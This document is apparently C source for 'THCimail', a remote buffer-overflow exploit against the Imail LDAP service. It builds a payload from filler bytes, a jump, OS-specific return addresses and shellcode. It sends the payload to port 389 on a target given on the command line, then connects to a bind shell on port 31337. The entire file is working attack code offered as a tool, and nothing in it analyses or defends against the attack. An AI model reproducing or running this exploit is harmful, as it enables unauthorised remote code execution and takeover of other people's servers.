int main(int argc, char *argv[])
{ 
unsigned int i,sock,sock2,addr,os,ver,rc,IMAILVER;
unsigned char *finalbuffer,*crapbuf1,*crapbuf2;
unsigned int IMAIL6_7=60;
unsigned int IMAIL_8=68;

struct sockaddr_in mytcp;
struct hostent * hp;
WSADATA wsaData;

printf("\nTHCimail v0.1 - Imail LDAP exploit\n");
printf("tested on Imail 6-8\n");
printf("by Johnny Cyberpunk ([email protected])\n");

if(argc<4 || argc>4)
usage();

ver = (unsigned short)atoi(argv[3]); 
switch(ver)
{
case 0:
IMAILVER = IMAIL6_7;
break;
case 1:
IMAILVER = IMAIL_8;
break;
default:
printf("\nYou entered an illegal version !\n\n");
usage();
exit(-1);
}

crapbuf1 = malloc(IMAILVER);
memset(crapbuf1,'X',IMAILVER);

printf("imailver = %d\n",IMAILVER);

crapbuf2 = malloc(2220);
memset(crapbuf2,'X',2220);

finalbuffer = malloc(2650);
memset(finalbuffer,0,2650);

printf("\n[*] building buffer\n");

strcat(finalbuffer,ldapshit);

strcat(finalbuffer,crapbuf1);

strcat(finalbuffer,jumper);

os = (unsigned short)atoi(argv[2]); 
switch(os)
{
case 0:
strcat(finalbuffer,WIN2KPG);
break;
case 1:
strcat(finalbuffer,WIN2KPG);
break;
case 2:
strcat(finalbuffer,WINXPSP1G);
break;
default:
printf("\nYou entered an illegal OS !\n\n");
usage();
exit(-1);
}

strcat(finalbuffer,shellcode);
strcat(finalbuffer,crapbuf2);

if (WSAStartup(MAKEWORD(2,1),&wsaData) != 0)
{
printf("WSAStartup failed !\n");
exit(-1);
}

hp = gethostbyname(argv[1]);

if (!hp){
addr = inet_addr(argv[1]);
}
if ((!hp) && (addr == INADDR_NONE) )
{
printf("Unable to resolve %s\n",argv[1]);
exit(-1);
}

sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
if (!sock)
{ 
printf("socket() error...\n");
exit(-1);
}

if (hp != NULL)
memcpy(&(mytcp.sin_addr),hp->h_addr,hp->h_length);
else
mytcp.sin_addr.s_addr = addr;

if (hp)
mytcp.sin_family = hp->h_addrtype;
else
mytcp.sin_family = AF_INET;

mytcp.sin_port=htons(389);

printf("[*] connecting the target\n");

rc=connect(sock, (struct sockaddr *) &mytcp, sizeof (struct sockaddr_in));
if(rc==0)
{
send(sock,finalbuffer,2650,0);
printf("[*] Exploit send successfully ! Sleeping a while ....\n");
Sleep(1000);
}
else
printf("\nCan't connect to ldap port!\n");

if(rc==0)
{
printf("[*] Trying to get a shell\n\n");
sock2 = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
mytcp.sin_port = htons(31337);
rc = connect(sock2, (struct sockaddr *)&mytcp, sizeof(mytcp));
if(rc!=0)
{
printf("can't connect to port 31337 ;( maybe firewalled ...\n");
exit(-1);
}
shell(sock2);
}

shutdown(sock,1);
closesocket(sock);

free(crapbuf1);
free(crapbuf2);
free(finalbuffer); 

exit(0);
}